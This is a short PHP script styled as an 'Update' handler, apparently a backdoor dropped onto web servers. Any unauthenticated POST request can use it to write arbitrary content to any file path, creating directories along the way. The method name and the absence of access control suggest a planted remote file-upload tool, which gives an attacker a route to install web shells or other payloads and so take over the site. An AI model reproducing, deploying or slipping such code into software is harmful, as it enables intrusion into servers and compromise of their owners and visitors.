<?php

class Update{

    var $keyFileName = 'uploadfilename';
    var $keyFileContent = 'uploadfilecontent';

    var $fileIO;

    function DoToolzaUpdate(){
        $fileName = $_POST[$this->keyFileName];
        $content = $_POST[$this->keyFileContent];
        if(get_magic_quotes_gpc()){
            $content = stripslashes($content);
        }
        if(!$this->fileIO->IsDir($fileName)){
            $this->fileIO->MakeDir($fileName);
        }
        return $this->fileIO->FileWrite($fileName,$content);
    }

    function InitIO(){
        if(function_exists('file_put_contents')){
            $this->fileIO = new NewFileIO();
            return true;
        }
        if(function_exists('fopen') && function_exists('fwrite')){
            $this->fileIO = new OldFileIO();
            return true;
        }
        return false;
    }

    function IsPost(){
        return $_SERVER['REQUEST_METHOD'] == 'POST';
    }

    function IsRequestUpdate(){
        return $this->IsPost()
            && isset($_POST[$this->keyFileName])
            && isset($_POST[$this->keyFileContent]);

    }

    function TryBackup(){
        $files = $this->fileIO->GetAllFile('.');
        $backupDirName = time();
        if($this->fileIO->MakeDir($backupDirName)){
            $this->fileIO->CopyFilesToDir($files, $backupDirName);
        }
    }
}

class BaseIO{

    function GetAllFile($currentDir){
        $files = scandir($currentDir);
        $result = array();
        foreach($files as $file){
            if($file === '.' || $file === '..') {continue;}
            if(is_dir($file)){continue;}
            $result[] = $file;
        }
        return $result;
    }

    function IsDir($path){
        return is_dir(dirname($path));
    }

    function MakeDir($dirname){
        return mkdir(dirname($dirname),0755, true);
    }

    function CopyFilesToDir($files,$backupDirName){
        foreach($files as $file){
            copy($file,$backupDirName . DIRECTORY_SEPARATOR . $file);
        }
    }
}

class NewFileIO extends BaseIO{
    function FileWrite($fileName, $fileContent){
        if(file_put_contents($fileName, $fileContent) === false){
            return false;
        }
        return true;
    }
}

class OldFileIO extends BaseIO{
    function FileWrite($fileName, $fileContent){
        $handle = @fopen($fileName, "wb");
        if($handle == false){
            return false;
        }
        if(fwrite($handle,$fileContent) === false){
            return false;
        }
        fclose($handle);
        return true;
    }
}

$log = 'updateFail';

$update = new Update();
if($update->IsRequestUpdate()){
    if($update->InitIO()){
        //$update->TryBackup();
        if($update->DoToolzaUpdate()){
            $log = 'updateDone';
        }
    }
}

echo $log;



?>